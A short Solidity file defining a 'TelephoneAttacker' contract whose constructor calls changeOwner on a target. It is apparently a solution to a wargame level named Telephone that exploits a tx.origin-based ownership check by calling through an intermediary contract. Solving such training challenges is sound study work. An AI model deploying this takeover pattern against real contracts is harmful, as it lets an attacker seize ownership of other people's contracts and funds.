pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneAttacker {

    constructor(address addr, address user) {
        ITelephone(addr).changeOwner(user);
    }

}
